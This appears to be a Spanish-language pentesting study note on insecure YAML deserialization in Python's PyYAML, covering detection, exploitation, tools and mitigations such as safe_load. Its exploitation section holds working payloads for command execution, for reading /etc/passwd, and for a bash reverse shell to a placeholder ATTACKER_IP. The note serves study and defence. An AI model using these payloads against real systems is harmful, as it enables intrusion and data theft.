
---
Tags: #python #deserialization #yaml #rce #websecurity #pentesting #bugbounty

---

## 📌 Definición
La **deserialización insegura de YAML en Python** ocurre cuando una aplicación carga datos YAML sin validar ni restringir su contenido, usando librerías como `PyYAML`.  

- Vulnerabilidad típica: uso de `yaml.load()` con **entrada no confiable**.
- Riesgo: ejecución de código arbitrario, escalada de privilegios, exfiltración de datos.

### Ejemplo vulnerable

```python
import yaml

# Entrada YAML sin validar
data = """
!!python/object/apply:os.system
- "ls -la"
"""
yaml.load(data, Loader=yaml.Loader)  # Vulnerable
```

---
## 🔎 Métodos de Detección

1. Revisar código fuente o dependencias:
    
    - `yaml.load()` sin `Loader=yaml.SafeLoader`
        
    - Uso de `yaml.FullLoader` o `UnsafeLoader` con input externo
        
2. Analizar parámetros de carga de archivos `.yaml` o strings
    
3. Revisar endpoints que aceptan archivos YAML:
    
    - Formularios de importación de configuración
        
    - APIs REST que aceptan YAML
        
4. Pruebas dinámicas:
    
    - Enviar payloads YAML maliciosos en campos de formulario
        
    - Revisar ejecución de comandos o comportamiento inesperado
        

---

## 💥 Métodos de Explotación

### 1. Ejecución remota de comandos (RCE)

[!] En el laboratorio de practica solo me funciono este, me fallaba cuando ponia mas de 1 argumento como ["cat", "/etc/passwd"]

`yaml: !!python/object/apply:subprocess.check_output ['ls']`

- Se ejecuta en el servidor al deserializar.
    
- Permite comprobar permisos y potencial escalada.
    

### 2. Lectura de archivos sensibles

`yaml: !!python/object/apply:open ["/etc/passwd"]`

- Exfiltra información sensible.
    
### 3. Construcción de payloads encadenados

`!!python/object/apply:subprocess.Popen - ["bash","-c","bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"]`

- Reverse shell en caso de que la app permita ejecución de comandos.
    

### 4. Bypass de filtros

- Obfuscación de rutas o clases con alias YAML
    
- Uso de múltiples `!!python/object/apply`
    

---

## ⚙️ Técnicas y Herramientas

1. **PyYAML**: revisar si se usa `yaml.load()` con Loader inseguro.
    
2. **Burp Suite**: interceptar y modificar archivos YAML.
    
3. **Python scripts**: generar payloads de RCE.
    
4. **Exfiltración de tokens**: usar YAML para leer credenciales locales.
    

---

## 🚨 Mitigaciones

1. Siempre usar `SafeLoader` al deserializar:
    

`yaml.safe_load(data)`

2. Validar el contenido de YAML antes de cargarlo.
    
3. No permitir carga de archivos YAML de fuentes externas sin control.
    
4. Limitar permisos de la aplicación para reducir el impacto de un RCE.
    
5. Revisar dependencias de terceros que puedan usar YAML inseguro.
    

---
